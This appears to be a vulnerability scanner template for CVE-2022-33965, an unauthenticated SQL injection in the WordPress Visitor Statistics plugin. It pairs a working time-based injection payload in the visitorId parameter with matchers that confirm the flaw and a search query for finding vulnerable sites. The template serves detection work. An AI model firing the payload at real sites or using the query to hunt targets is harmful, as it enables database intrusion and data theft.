id: CVE-2022-33965
info:
  name: WordPress Visitor Statistics <=5.7 - SQL Injection
  author: theamanrawat
  severity: critical
  description: The WordPress Visitor Statistics plugin version 5.7 and earlier contains
    unauthenticated SQL injection vulnerabilities, which can potentially lead to sensitive
    information theft or unauthorized administrative operations.
  reference:
  - https://patchstack.com/database/vulnerability/wp-stats-manager/wordpress-wp-visitor-statistics-plugin-5-7-multiple-unauthenticated-sql-injection-sqli-vulnerabilities
  - https://wordpress.org/plugins/wp-stats-manager/
  - https://wordpress.org/plugins/wp-stats-manager/#developers
  - https://nvd.nist.gov/vuln/detail/CVE-2022-33965
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-33965
    cwe-id: CWE-89
  metadata:
    google-query: inurl:"/wp-content/plugins/wp-stats-manager"
    verified: 'true'
    impact: The SQL injection vulnerability in WordPress Visitor Statistics plugin
      <=5.7 can have a significant impact by potentially enabling an attacker to access
      sensitive information, modify data, and conduct unauthorized administrative
      actions on the affected website.
    recommendation: It is recommended that WordPress users update the Visitor Statistics
      plugin to the latest version to mitigate the possibility of unauthorized SQL
      injection vulnerabilities.
  tags: cve,cve2022,wordpress,wp-plugin,wp,unauth,sqli,wp-stats-manager
requests:
- raw:
  - '@timeout: 15s

    GET /?wmcAction=wmcTrack&url=test&uid=0&pid=0&visitorId=1331''+and+sleep(5)+or+''
    HTTP/1.1

    Host: {{Hostname}}

    '
  matchers-condition: and
  matchers:
  - type: dsl
    dsl:
    - duration>=5
  - type: regex
    regex:
    - ^1331' and sleep\(5\) or '$
  - type: status
    status:
    - 200
